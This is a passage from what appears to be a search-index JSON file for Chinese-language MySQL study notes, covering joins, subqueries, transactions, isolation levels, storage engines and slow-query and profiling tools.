[ OUTER ] JOIN \u88682 ON \u6761\u4ef6 ...;</code> </p> <p>\u4f8b\u5b50\uff1a</p> MySQL<pre><code>-- \u5de6\nselect e.*, d.name from employee as e left outer join dept as d on e.dept = d.id;  \nselect d.name, e.* from dept d left outer join emp e on e.dept = d.id;  -- \u8fd9\u6761\u8bed\u53e5\u4e0e\u4e0b\u9762\u7684\u8bed\u53e5\u6548\u679c\u4e00\u6837  \n-- \u53f3\nselect d.name, e.* from employee as e right outer join dept as d on e.dept = d.id;  \n</code></pre> <p>\u5de6\u8fde\u63a5\u53ef\u4ee5\u67e5\u8be2\u5230\u6ca1\u6709dept\u7684employee\uff0c\u53f3\u8fde\u63a5\u53ef\u4ee5\u67e5\u8be2\u5230\u6ca1\u6709employee\u7684dept  </p>"},{"location":"program/2024-04-22-MYSQL/#_39","title":"\u81ea\u8fde\u63a5\u67e5\u8be2","text":"<p>\u5f53\u524d\u8868\u4e0e\u81ea\u8eab\u7684\u8fde\u63a5\u67e5\u8be2\uff0c\u81ea\u8fde\u63a5\u5fc5\u987b\u4f7f\u7528\u8868\u522b\u540d  </p> <p>\u8bed\u6cd5\uff1a <code>SELECT \u5b57\u6bb5\u5217\u8868 FROM \u8868A \u522b\u540dA JOIN \u8868A \u522b\u540dB ON \u6761\u4ef6 ...;</code> </p> <p>\u81ea\u8fde\u63a5\u67e5\u8be2\uff0c\u53ef\u4ee5\u662f\u5185\u8fde\u63a5\u67e5\u8be2\uff0c\u4e5f\u53ef\u4ee5\u662f\u5916\u8fde\u63a5\u67e5\u8be2  </p> <p>\u4f8b\u5b50\uff1a</p> MySQL<pre><code>-- \u67e5\u8be2\u5458\u5de5\u53ca\u5176\u6240\u5c5e\u9886\u5bfc\u7684\u540d\u5b57  \nselect a.name, b.name from employee a, employee b where a.manager = b.id;  \n-- \u6ca1\u6709\u9886\u5bfc\u7684\u4e5f\u67e5\u8be2\u51fa\u6765  \nselect a.name, b.name from employee a left join employee b on a.manager = b.id;  \n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#union-union-all","title":"\u8054\u5408\u67e5\u8be2 union, union all","text":"<p>\u628a\u591a\u6b21\u67e5\u8be2\u7684\u7ed3\u679c\u5408\u5e76\uff0c\u5f62\u6210\u4e00\u4e2a\u65b0\u7684\u67e5\u8be2\u96c6</p> <p>\u8bed\u6cd5\uff1a</p> MySQL<pre><code>SELECT \u5b57\u6bb5\u5217\u8868 FROM \u8868A ...\nUNION [ALL]\nSELECT \u5b57\u6bb5\u5217\u8868 FROM \u8868B ...\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_40","title":"\u6ce8\u610f\u4e8b\u9879","text":"<ul> <li>UNION ALL \u4f1a\u6709\u91cd\u590d\u7ed3\u679c\uff0cUNION \u4e0d\u4f1a</li> <li>\u8054\u5408\u67e5\u8be2\u6bd4\u4f7f\u7528or\u6548\u7387\u9ad8\uff0c\u4e0d\u4f1a\u4f7f\u7d22\u5f15\u5931\u6548</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_41","title":"\u5b50\u67e5\u8be2","text":"<p>SQL\u8bed\u53e5\u4e2d\u5d4c\u5957SELECT\u8bed\u53e5\uff0c\u79f0\u8c13\u5d4c\u5957\u67e5\u8be2\uff0c\u53c8\u79f0\u5b50\u67e5\u8be2\u3002 <code>SELECT * FROM t1 WHERE column1 = ( SELECT column1 FROM t2);</code> \u5b50\u67e5\u8be2\u5916\u90e8\u7684\u8bed\u53e5\u53ef\u4ee5\u662f INSERT / UPDATE / DELETE / SELECT \u7684\u4efb\u4f55\u4e00\u4e2a </p> <p>\u6839\u636e\u5b50\u67e5\u8be2\u7ed3\u679c\u53ef\u4ee5\u5206\u4e3a\uff1a</p> <ul> <li>\u6807\u91cf\u5b50\u67e5\u8be2\uff08\u5b50\u67e5\u8be2\u7ed3\u679c\u4e3a\u5355\u4e2a\u503c\uff09</li> <li>\u5217\u5b50\u67e5\u8be2\uff08\u5b50\u67e5\u8be2\u7ed3\u679c\u4e3a\u4e00\u5217\uff09</li> <li>\u884c\u5b50\u67e5\u8be2\uff08\u5b50\u67e5\u8be2\u7ed3\u679c\u4e3a\u4e00\u884c\uff09</li> <li>\u8868\u5b50\u67e5\u8be2\uff08\u5b50\u67e5\u8be2\u7ed3\u679c\u4e3a\u591a\u884c\u591a\u5217\uff09</li> </ul> <p>\u6839\u636e\u5b50\u67e5\u8be2\u4f4d\u7f6e\u53ef\u5206\u4e3a\uff1a</p> <ul> <li>WHERE \u4e4b\u540e</li> <li>FROM \u4e4b\u540e</li> <li>SELECT \u4e4b\u540e</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_42","title":"\u6807\u91cf\u5b50\u67e5\u8be2","text":"<p>\u5b50\u67e5\u8be2\u8fd4\u56de\u7684\u7ed3\u679c\u662f\u5355\u4e2a\u503c\uff08\u6570\u5b57\u3001\u5b57\u7b26\u4e32\u3001\u65e5\u671f\u7b49\uff09\u3002 \u5e38\u7528\u64cd\u4f5c\u7b26\uff1a- &lt; &gt; &gt; &gt;= &lt; &lt;=  </p> <p>\u4f8b\u5b50\uff1a</p> MySQL<pre><code>-- \u67e5\u8be2\u9500\u552e\u90e8\u6240\u6709\u5458\u5de5\nselect id from dept where name = '\u9500\u552e\u90e8';\n-- \u6839\u636e\u9500\u552e\u90e8\u90e8\u95e8ID\uff0c\u67e5\u8be2\u5458\u5de5\u4fe1\u606f\nselect * from employee where dept = 4;\n-- \u5408\u5e76\uff08\u5b50\u67e5\u8be2\uff09  \nselect * from employee where dept = (select id from dept where name = '\u9500\u552e\u90e8');  \n\n-- \u67e5\u8be2xxx\u5165\u804c\u4e4b\u540e\u7684\u5458\u5de5\u4fe1\u606f  \nselect * from employee where entrydate &gt; (select entrydate from employee where name = 'xxx');  \n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_43","title":"\u5217\u5b50\u67e5\u8be2","text":"<p>\u8fd4\u56de\u7684\u7ed3\u679c\u662f\u4e00\u5217\uff08\u53ef\u4ee5\u662f\u591a\u884c\uff09\u3002  </p> <p>\u5e38\u7528\u64cd\u4f5c\u7b26\uff1a  </p> \u64cd\u4f5c\u7b26 \u63cf\u8ff0 IN \u5728\u6307\u5b9a\u7684\u96c6\u5408\u8303\u56f4\u5185\uff0c\u591a\u9009\u4e00 NOT IN \u4e0d\u5728\u6307\u5b9a\u7684\u96c6\u5408\u8303\u56f4\u5185 ANY \u5b50\u67e5\u8be2\u8fd4\u56de\u5217\u8868\u4e2d\uff0c\u6709\u4efb\u610f\u4e00\u4e2a\u6ee1\u8db3\u5373\u53ef SOME \u4e0eANY\u7b49\u540c\uff0c\u4f7f\u7528SOME\u7684\u5730\u65b9\u90fd\u53ef\u4ee5\u4f7f\u7528ANY ALL \u5b50\u67e5\u8be2\u8fd4\u56de\u5217\u8868\u7684\u6240\u6709\u503c\u90fd\u5fc5\u987b\u6ee1\u8db3 <p>\u4f8b\u5b50\uff1a</p> MySQL<pre><code>-- \u67e5\u8be2\u9500\u552e\u90e8\u548c\u5e02\u573a\u90e8\u7684\u6240\u6709\u5458\u5de5\u4fe1\u606f  \nselect * from employee where dept in (select id from dept where name = '\u9500\u552e\u90e8' or name = '\u5e02\u573a\u90e8');\n-- \u67e5\u8be2\u6bd4\u8d22\u52a1\u90e8\u6240\u6709\u4eba\u5de5\u8d44\u90fd\u9ad8\u7684\u5458\u5de5\u4fe1\u606f\nselect * from employee where salary &gt; all(select salary from employee where dept = (select id from dept where name = '\u8d22\u52a1\u90e8'));\n-- \u67e5\u8be2\u6bd4\u7814\u53d1\u90e8\u4efb\u610f\u4e00\u4eba\u5de5\u8d44\u9ad8\u7684\u5458\u5de5\u4fe1\u606f\nselect * from employee where salary &gt; any (select salary from employee where dept = (select id from dept where name = '\u7814\u53d1\u90e8'));\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_44","title":"\u884c\u5b50\u67e5\u8be2","text":"<p>\u8fd4\u56de\u7684\u7ed3\u679c\u662f\u4e00\u884c\uff08\u53ef\u4ee5\u662f\u591a\u5217\uff09\u3002 \u5e38\u7528\u64cd\u4f5c\u7b26\uff1a=, &lt;, &gt;, IN, NOT IN</p> <p>\u4f8b\u5b50\uff1a</p> MySQL<pre><code>-- \u67e5\u8be2\u4e0exxx\u7684\u85aa\u8d44\u53ca\u76f4\u5c5e\u9886\u5bfc\u76f8\u540c\u7684\u5458\u5de5\u4fe1\u606f  \nselect * from employee where (salary, manager) = (12500, 1);  \nselect * from employee where (salary, manager) = (select salary, manager from employee where name = 'xxx');  \n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_45","title":"\u8868\u5b50\u67e5\u8be2","text":"<p>\u8fd4\u56de\u7684\u7ed3\u679c\u662f\u591a\u884c\u591a\u5217 \u5e38\u7528\u64cd\u4f5c\u7b26\uff1aIN  </p> <p>\u4f8b\u5b50\uff1a</p> MySQL<pre><code>-- \u67e5\u8be2\u4e0exxx1\uff0cxxx2\u7684\u804c\u4f4d\u548c\u85aa\u8d44\u76f8\u540c\u7684\u5458\u5de5\nselect * from employee where (job, salary) in (select job, salary from employee where name = 'xxx1' or name = 'xxx2');\n-- \u67e5\u8be2\u5165\u804c\u65e5\u671f\u662f2006-01-01\u4e4b\u540e\u7684\u5458\u5de5\uff0c\u53ca\u5176\u90e8\u95e8\u4fe1\u606f\nselect e.*, d.* from (select * from employee where entrydate &gt; '2006-01-01') as e left join dept as d on e.dept = d.id;\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_46","title":"\u4e8b\u52a1","text":"<p>\u4e8b\u52a1\u662f\u4e00\u7ec4\u64cd\u4f5c\u7684\u96c6\u5408\uff0c\u4e8b\u52a1\u4f1a\u628a\u6240\u6709\u64cd\u4f5c\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u4e00\u8d77\u5411\u7cfb\u7edf\u63d0\u4ea4\u6216\u64a4\u9500\u64cd\u4f5c\u8bf7\u6c42\uff0c\u5373\u8fd9\u4e9b\u64cd\u4f5c\u8981\u4e48\u540c\u65f6\u6210\u529f\uff0c\u8981\u4e48\u540c\u65f6\u5931\u8d25\u3002</p> <p>\u57fa\u672c\u64cd\u4f5c\uff1a</p> MySQL<pre><code>-- 1. \u67e5\u8be2\u5f20\u4e09\u8d26\u6237\u4f59\u989d\nselect * from account where name = '\u5f20\u4e09';\n-- 2. \u5c06\u5f20\u4e09\u8d26\u6237\u4f59\u989d-1000\nupdate account set money = money - 1000 where name = '\u5f20\u4e09';\n-- \u6b64\u8bed\u53e5\u51fa\u9519\u540e\u5f20\u4e09\u94b1\u51cf\u5c11\u4f46\u662f\u674e\u56db\u94b1\u6ca1\u6709\u589e\u52a0\n\u6a21\u62dfsql\u8bed\u53e5\u9519\u8bef\n-- 3. \u5c06\u674e\u56db\u8d26\u6237\u4f59\u989d+1000\nupdate account set money = money + 1000 where name = '\u674e\u56db';\n\n-- \u67e5\u770b\u4e8b\u52a1\u63d0\u4ea4\u65b9\u5f0f\nSELECT @@AUTOCOMMIT;\n-- \u8bbe\u7f6e\u4e8b\u52a1\u63d0\u4ea4\u65b9\u5f0f\uff0c1\u4e3a\u81ea\u52a8\u63d0\u4ea4\uff0c0\u4e3a\u624b\u52a8\u63d0\u4ea4\uff0c\u8be5\u8bbe\u7f6e\u53ea\u5bf9\u5f53\u524d\u4f1a\u8bdd\u6709\u6548\nSET @@AUTOCOMMIT = 0;\n-- \u63d0\u4ea4\u4e8b\u52a1\nCOMMIT;\n-- \u56de\u6eda\u4e8b\u52a1\nROLLBACK;\n\n-- \u8bbe\u7f6e\u624b\u52a8\u63d0\u4ea4\u540e\u4e0a\u9762\u4ee3\u7801\u6539\u4e3a\uff1a\nselect * from account where name = '\u5f20\u4e09';  \nupdate account set money = money - 1000 where name = '\u5f20\u4e09';  \nupdate account set money = money + 1000 where name = '\u674e\u56db';  \ncommit;  \n</code></pre> <p>\u64cd\u4f5c\u65b9\u5f0f\u4e8c\uff1a</p> <p>\u5f00\u542f\u4e8b\u52a1\uff1a <code>START TRANSACTION \u6216 BEGIN TRANSACTION;</code> \u63d0\u4ea4\u4e8b\u52a1\uff1a <code>COMMIT;</code> \u56de\u6eda\u4e8b\u52a1\uff1a <code>ROLLBACK;</code></p> <p>\u64cd\u4f5c\u5b9e\u4f8b\uff1a</p> <p>MySQL<pre><code>start transaction; \nselect * from account where name = '\u5f20\u4e09';\nupdate account set money = money - 1000 where name = '\u5f20\u4e09';\nupdate account set money = money + 1000 where name = '\u674e\u56db';\ncommit;\n</code></pre> \u5f00\u542f\u4e8b\u52a1\u540e\uff0c\u53ea\u6709\u624b\u52a8\u63d0\u4ea4\u624d\u4f1a\u6539\u53d8\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u3002  </p>"},{"location":"program/2024-04-22-MYSQL/#acid","title":"\u56db\u5927\u7279\u6027ACID","text":"<ul> <li>\u539f\u5b50\u6027(Atomicity)\uff1a\u4e8b\u52a1\u662f\u4e0d\u53ef\u5206\u5272\u7684\u6700\u5c0f\u64cd\u4f5c\u4f46\u613f\uff0c\u8981\u4e48\u5168\u90e8\u6210\u529f\uff0c\u8981\u4e48\u5168\u90e8\u5931\u8d25</li> <li>\u4e00\u81f4\u6027(Consistency)\uff1a\u4e8b\u52a1\u5b8c\u6210\u65f6\uff0c\u5fc5\u987b\u4f7f\u6240\u6709\u6570\u636e\u90fd\u4fdd\u6301\u4e00\u81f4\u72b6\u6001</li> <li>\u9694\u79bb\u6027(Isolation)\uff1a\u6570\u636e\u5e93\u7cfb\u7edf\u63d0\u4f9b\u7684\u9694\u79bb\u673a\u5236\uff0c\u4fdd\u8bc1\u4e8b\u52a1\u5728\u4e0d\u53d7\u5916\u90e8\u5e76\u53d1\u64cd\u4f5c\u5f71\u54cd\u7684\u72ec\u7acb\u73af\u5883\u4e0b\u8fd0\u884c</li> <li>\u6301\u4e45\u6027(Durability)\uff1a\u4e8b\u52a1\u4e00\u65e6\u63d0\u4ea4\u6216\u56de\u6eda\uff0c\u5b83\u5bf9\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u7684\u6539\u53d8\u5c31\u662f\u6c38\u4e45\u7684</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_47","title":"\u5e76\u53d1\u4e8b\u52a1","text":"\u95ee\u9898 \u63cf\u8ff0 \u810f\u8bfb \u4e00\u4e2a\u4e8b\u52a1\u8bfb\u5230\u53e6\u4e00\u4e2a\u4e8b\u52a1\u8fd8\u6ca1\u63d0\u4ea4\u7684\u6570\u636e \u4e0d\u53ef\u91cd\u590d\u8bfb \u4e00\u4e2a\u4e8b\u52a1\u5148\u540e\u8bfb\u53d6\u540c\u4e00\u6761\u8bb0\u5f55\uff0c\u4f46\u4e24\u6b21\u8bfb\u53d6\u7684\u6570\u636e\u4e0d\u540c \u5e7b\u8bfb \u4e00\u4e2a\u4e8b\u52a1\u6309\u7167\u6761\u4ef6\u67e5\u8be2\u6570\u636e\u65f6\uff0c\u6ca1\u6709\u5bf9\u5e94\u7684\u6570\u636e\u884c\uff0c\u4f46\u662f\u518d\u63d2\u5165\u6570\u636e\u65f6\uff0c\u53c8\u53d1\u73b0\u8fd9\u884c\u6570\u636e\u5df2\u7ecf\u5b58\u5728 <p>\u8fd9\u4e09\u4e2a\u95ee\u9898\u7684\u8be6\u7ec6\u6f14\u793a\uff1ahttps://www.bilibili.com/video/BV1Kr4y1i7ru?p=55cd </p> <p>\u5e76\u53d1\u4e8b\u52a1\u9694\u79bb\u7ea7\u522b\uff1a</p> \u9694\u79bb\u7ea7\u522b \u810f\u8bfb \u4e0d\u53ef\u91cd\u590d\u8bfb \u5e7b\u8bfb Read uncommitted \u221a \u221a \u221a Read committed \u00d7 \u221a \u221a Repeatable Read(\u9ed8\u8ba4) \u00d7 \u00d7 \u221a Serializable \u00d7 \u00d7 \u00d7 <ul> <li>\u221a\u8868\u793a\u5728\u5f53\u524d\u9694\u79bb\u7ea7\u522b\u4e0b\u8be5\u95ee\u9898\u4f1a\u51fa\u73b0</li> <li>Serializable \u6027\u80fd\u6700\u4f4e\uff1bRead uncommitted \u6027\u80fd\u6700\u9ad8\uff0c\u6570\u636e\u5b89\u5168\u6027\u6700\u5dee</li> </ul> <p>\u67e5\u770b\u4e8b\u52a1\u9694\u79bb\u7ea7\u522b\uff1a <code>SELECT @@TRANSACTION_ISOLATION;</code> \u8bbe\u7f6e\u4e8b\u52a1\u9694\u79bb\u7ea7\u522b\uff1a <code>SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL {READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE };</code> SESSION \u662f\u4f1a\u8bdd\u7ea7\u522b\uff0c\u8868\u793a\u53ea\u9488\u5bf9\u5f53\u524d\u4f1a\u8bdd\u6709\u6548\uff0cGLOBAL \u8868\u793a\u5bf9\u6240\u6709\u4f1a\u8bdd\u6709\u6548  </p>"},{"location":"program/2024-04-22-MYSQL/#_48","title":"\u8fdb\u9636\u7bc7","text":""},{"location":"program/2024-04-22-MYSQL/#_49","title":"\u5b58\u50a8\u5f15\u64ce","text":"<p>MySQL\u4f53\u7cfb\u7ed3\u6784\uff1a</p> <p> </p> <p>\u5b58\u50a8\u5f15\u64ce\u5c31\u662f\u5b58\u50a8\u6570\u636e\u3001\u5efa\u7acb\u7d22\u5f15\u3001\u66f4\u65b0/\u67e5\u8be2\u6570\u636e\u7b49\u6280\u672f\u7684\u5b9e\u73b0\u65b9\u5f0f\u3002\u5b58\u50a8\u5f15\u64ce\u662f\u57fa\u4e8e\u8868\u800c\u4e0d\u662f\u57fa\u4e8e\u5e93\u7684\uff0c\u6240\u4ee5\u5b58\u50a8\u5f15\u64ce\u4e5f\u53ef\u4ee5\u88ab\u79f0\u4e3a\u8868\u5f15\u64ce\u3002 \u9ed8\u8ba4\u5b58\u50a8\u5f15\u64ce\u662fInnoDB\u3002  </p> <p>\u76f8\u5173\u64cd\u4f5c\uff1a  </p> MySQL<pre><code>-- \u67e5\u8be2\u5efa\u8868\u8bed\u53e5\nshow create table account;  \n-- \u5efa\u8868\u65f6\u6307\u5b9a\u5b58\u50a8\u5f15\u64ce\nCREATE TABLE \u8868\u540d(\n    ...\n) ENGINE=INNODB;\n-- \u67e5\u770b\u5f53\u524d\u6570\u636e\u5e93\u652f\u6301\u7684\u5b58\u50a8\u5f15\u64ce\nshow engines;\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#innodb","title":"InnoDB","text":"<p>InnoDB \u662f\u4e00\u79cd\u517c\u987e\u9ad8\u53ef\u9760\u6027\u548c\u9ad8\u6027\u80fd\u7684\u901a\u7528\u5b58\u50a8\u5f15\u64ce\uff0c\u5728 MySQL 5.5 \u4e4b\u540e\uff0cInnoDB \u662f\u9ed8\u8ba4\u7684 MySQL \u5f15\u64ce\u3002  </p> <p>\u7279\u70b9\uff1a</p> <ul> <li>DML \u64cd\u4f5c\u9075\u5faa ACID \u6a21\u578b\uff0c\u652f\u6301\u4e8b\u52a1</li> <li>\u884c\u7ea7\u9501\uff0c\u63d0\u9ad8\u5e76\u53d1\u8bbf\u95ee\u6027\u80fd</li> <li>\u652f\u6301\u5916\u952e\u7ea6\u675f\uff0c\u4fdd\u8bc1\u6570\u636e\u7684\u5b8c\u6574\u6027\u548c\u6b63\u786e\u6027</li> </ul> <p>\u6587\u4ef6\uff1a</p> <ul> <li>xxx.ibd: xxx\u4ee3\u8868\u8868\u540d\uff0cInnoDB \u5f15\u64ce\u7684\u6bcf\u5f20\u8868\u90fd\u4f1a\u5bf9\u5e94\u8fd9\u6837\u4e00\u4e2a\u8868\u7a7a\u95f4\u6587\u4ef6\uff0c\u5b58\u50a8\u8be5\u8868\u7684\u8868\u7ed3\u6784\uff08frm\u3001sdi\uff09\u3001\u6570\u636e\u548c\u7d22\u5f15\u3002</li> </ul> <p>\u53c2\u6570\uff1ainnodb_file_per_table\uff0c\u51b3\u5b9a\u591a\u5f20\u8868\u5171\u4eab\u4e00\u4e2a\u8868\u7a7a\u95f4\u8fd8\u662f\u6bcf\u5f20\u8868\u5bf9\u5e94\u4e00\u4e2a\u8868\u7a7a\u95f4</p> <p>\u77e5\u8bc6\u70b9\uff1a</p> <p>\u67e5\u770b Mysql \u53d8\u91cf\uff1a <code>show variables like 'innodb_file_per_table';</code></p> <p>\u4eceidb\u6587\u4ef6\u63d0\u53d6\u8868\u7ed3\u6784\u6570\u636e\uff1a \uff08\u5728cmd\u8fd0\u884c\uff09 <code>ibd2sdi xxx.ibd</code></p> <p>InnoDB \u903b\u8f91\u5b58\u50a8\u7ed3\u6784\uff1a </p>"},{"location":"program/2024-04-22-MYSQL/#myisam","title":"MyISAM","text":"<p>MyISAM \u662f MySQL \u65e9\u671f\u7684\u9ed8\u8ba4\u5b58\u50a8\u5f15\u64ce\u3002</p> <p>\u7279\u70b9\uff1a</p> <ul> <li>\u4e0d\u652f\u6301\u4e8b\u52a1\uff0c\u4e0d\u652f\u6301\u5916\u952e</li> <li>\u652f\u6301\u8868\u9501\uff0c\u4e0d\u652f\u6301\u884c\u9501</li> <li>\u8bbf\u95ee\u901f\u5ea6\u5feb</li> </ul> <p>\u6587\u4ef6\uff1a</p> <ul> <li>xxx.sdi: \u5b58\u50a8\u8868\u7ed3\u6784\u4fe1\u606f</li> <li>xxx.MYD: \u5b58\u50a8\u6570\u636e</li> <li>xxx.MYI: \u5b58\u50a8\u7d22\u5f15</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#memory","title":"Memory","text":"<p>Memory \u5f15\u64ce\u7684\u8868\u6570\u636e\u662f\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u53d7\u786c\u4ef6\u95ee\u9898\u3001\u65ad\u7535\u95ee\u9898\u7684\u5f71\u54cd\uff0c\u53ea\u80fd\u5c06\u8fd9\u4e9b\u8868\u4f5c\u4e3a\u4e34\u65f6\u8868\u6216\u7f13\u5b58\u4f7f\u7528\u3002</p> <p>\u7279\u70b9\uff1a</p> <ul> <li>\u5b58\u653e\u5728\u5185\u5b58\u4e2d\uff0c\u901f\u5ea6\u5feb</li> <li>hash\u7d22\u5f15\uff08\u9ed8\u8ba4\uff09</li> </ul> <p>\u6587\u4ef6\uff1a</p> <ul> <li>xxx.sdi: \u5b58\u50a8\u8868\u7ed3\u6784\u4fe1\u606f</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_50","title":"\u5b58\u50a8\u5f15\u64ce\u7279\u70b9","text":"\u7279\u70b9 InnoDB MyISAM Memory \u5b58\u50a8\u9650\u5236 64TB \u6709 \u6709 \u4e8b\u52a1\u5b89\u5168 \u652f\u6301 - - \u9501\u673a\u5236 \u884c\u9501 \u8868\u9501 \u8868\u9501 B+tree\u7d22\u5f15 \u652f\u6301 \u652f\u6301 \u652f\u6301 Hash\u7d22\u5f15 - - \u652f\u6301 \u5168\u6587\u7d22\u5f15 \u652f\u6301\uff085.6\u7248\u672c\u4e4b\u540e\uff09 \u652f\u6301 - \u7a7a\u95f4\u4f7f\u7528 \u9ad8 \u4f4e N/A \u5185\u5b58\u4f7f\u7528 \u9ad8 \u4f4e \u4e2d\u7b49 \u6279\u91cf\u63d2\u5165\u901f\u5ea6 \u4f4e \u9ad8 \u9ad8 \u652f\u6301\u5916\u952e \u652f\u6301 - -"},{"location":"program/2024-04-22-MYSQL/#_51","title":"\u5b58\u50a8\u5f15\u64ce\u7684\u9009\u62e9","text":"<p>\u5728\u9009\u62e9\u5b58\u50a8\u5f15\u64ce\u65f6\uff0c\u5e94\u8be5\u6839\u636e\u5e94\u7528\u7cfb\u7edf\u7684\u7279\u70b9\u9009\u62e9\u5408\u9002\u7684\u5b58\u50a8\u5f15\u64ce\u3002\u5bf9\u4e8e\u590d\u6742\u7684\u5e94\u7528\u7cfb\u7edf\uff0c\u8fd8\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u9009\u62e9\u591a\u79cd\u5b58\u50a8\u5f15\u64ce\u8fdb\u884c\u7ec4\u5408\u3002</p> <ul> <li>InnoDB: \u5982\u679c\u5e94\u7528\u5bf9\u4e8b\u7269\u7684\u5b8c\u6574\u6027\u6709\u6bd4\u8f83\u9ad8\u7684\u8981\u6c42\uff0c\u5728\u5e76\u53d1\u6761\u4ef6\u4e0b\u8981\u6c42\u6570\u636e\u7684\u4e00\u81f4\u6027\uff0c\u6570\u636e\u64cd\u4f5c\u9664\u4e86\u63d2\u5165\u548c\u67e5\u8be2\u4e4b\u5916\uff0c\u8fd8\u5305\u542b\u5f88\u591a\u7684\u66f4\u65b0\u3001\u5220\u9664\u64cd\u4f5c\uff0c\u5219 InnoDB \u662f\u6bd4\u8f83\u5408\u9002\u7684\u9009\u62e9</li> <li>MyISAM: \u5982\u679c\u5e94\u7528\u662f\u4ee5\u8bfb\u64cd\u4f5c\u548c\u63d2\u5165\u64cd\u4f5c\u4e3a\u4e3b\uff0c\u53ea\u6709\u5f88\u5c11\u7684\u66f4\u65b0\u548c\u5220\u9664\u64cd\u4f5c\uff0c\u5e76\u4e14\u5bf9\u4e8b\u52a1\u7684\u5b8c\u6574\u6027\u3001\u5e76\u53d1\u6027\u8981\u6c42\u4e0d\u9ad8\uff0c\u90a3\u8fd9\u4e2a\u5b58\u50a8\u5f15\u64ce\u662f\u975e\u5e38\u5408\u9002\u7684\u3002</li> <li>Memory: \u5c06\u6240\u6709\u6570\u636e\u4fdd\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u8bbf\u95ee\u901f\u5ea6\u5feb\uff0c\u901a\u5e38\u7528\u4e8e\u4e34\u65f6\u8868\u53ca\u7f13\u5b58\u3002Memory \u7684\u7f3a\u9677\u662f\u5bf9\u8868\u7684\u5927\u5c0f\u6709\u9650\u5236\uff0c\u592a\u5927\u7684\u8868\u65e0\u6cd5\u7f13\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u800c\u4e14\u65e0\u6cd5\u4fdd\u969c\u6570\u636e\u7684\u5b89\u5168\u6027</li> </ul> <p>\u7535\u5546\u4e2d\u7684\u8db3\u8ff9\u548c\u8bc4\u8bba\u9002\u5408\u4f7f\u7528 MyISAM \u5f15\u64ce\uff0c\u7f13\u5b58\u9002\u5408\u4f7f\u7528 Memory \u5f15\u64ce\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#_52","title":"\u6027\u80fd\u5206\u6790","text":""},{"location":"program/2024-04-22-MYSQL/#_53","title":"\u67e5\u770b\u6267\u884c\u9891\u6b21","text":"<p>\u67e5\u770b\u5f53\u524d\u6570\u636e\u5e93\u7684 INSERT, UPDATE, DELETE, SELECT \u8bbf\u95ee\u9891\u6b21\uff1a <code>SHOW GLOBAL STATUS LIKE 'Com_______';</code> \u6216\u8005 <code>SHOW SESSION STATUS LIKE 'Com_______';</code> \u4f8b\uff1a<code>show global status like 'Com_______'</code> </p>"},{"location":"program/2024-04-22-MYSQL/#_54","title":"\u6162\u67e5\u8be2\u65e5\u5fd7","text":"<p>\u6162\u67e5\u8be2\u65e5\u5fd7\u8bb0\u5f55\u4e86\u6240\u6709\u6267\u884c\u65f6\u95f4\u8d85\u8fc7\u6307\u5b9a\u53c2\u6570\uff08long_query_time\uff0c\u5355\u4f4d\uff1a\u79d2\uff0c\u9ed8\u8ba410\u79d2\uff09\u7684\u6240\u6709SQL\u8bed\u53e5\u7684\u65e5\u5fd7\u3002 MySQL\u7684\u6162\u67e5\u8be2\u65e5\u5fd7\u9ed8\u8ba4\u6ca1\u6709\u5f00\u542f\uff0c\u9700\u8981\u5728MySQL\u7684\u914d\u7f6e\u6587\u4ef6\uff08/etc/my.cnf\uff09\u4e2d\u914d\u7f6e\u5982\u4e0b\u4fe1\u606f\uff1a     # \u5f00\u542f\u6162\u67e5\u8be2\u65e5\u5fd7\u5f00\u5173     slow_query_log=1     # \u8bbe\u7f6e\u6162\u67e5\u8be2\u65e5\u5fd7\u7684\u65f6\u95f4\u4e3a2\u79d2\uff0cSQL\u8bed\u53e5\u6267\u884c\u65f6\u95f4\u8d85\u8fc72\u79d2\uff0c\u5c31\u4f1a\u89c6\u4e3a\u6162\u67e5\u8be2\uff0c\u8bb0\u5f55\u6162\u67e5\u8be2\u65e5\u5fd7     long_query_time=2 \u66f4\u6539\u540e\u8bb0\u5f97\u91cd\u542fMySQL\u670d\u52a1\uff0c\u65e5\u5fd7\u6587\u4ef6\u4f4d\u7f6e\uff1a/var/lib/mysql/localhost-slow.log  </p> <p>\u67e5\u770b\u6162\u67e5\u8be2\u65e5\u5fd7\u5f00\u5173\u72b6\u6001\uff1a <code>show variables like 'slow_query_log';</code> </p>"},{"location":"program/2024-04-22-MYSQL/#profile","title":"profile","text":"<p>show profile \u80fd\u5728\u505aSQL\u4f18\u5316\u65f6\u5e2e\u6211\u4eec\u4e86\u89e3\u65f6\u95f4\u90fd\u8017\u8d39\u5728\u54ea\u91cc\u3002\u901a\u8fc7 have_profiling \u53c2\u6570\uff0c\u80fd\u770b\u5230\u5f53\u524d MySQL \u662f\u5426\u652f\u6301 profile \u64cd\u4f5c\uff1a <code>SELECT @@have_profiling;</code> profiling \u9ed8\u8ba4\u5173\u95ed\uff0c\u53ef\u4ee5\u901a\u8fc7set\u8bed\u53e5\u5728session/global\u7ea7\u522b\u5f00\u542f profiling\uff1a <code>SET profiling = 1;</code> \u67e5\u770b\u6240\u6709\u8bed\u53e5\u7684\u8017\u65f6\uff1a <code>show profiles;</code> \u67e5\u770b\u6307\u5b9aquery_id\u7684SQL\u8bed\u53e5\u5404\u4e2a\u9636\u6bb5\u7684\u8017\u65f6\uff1a <code>show profile for query query_id;</code> 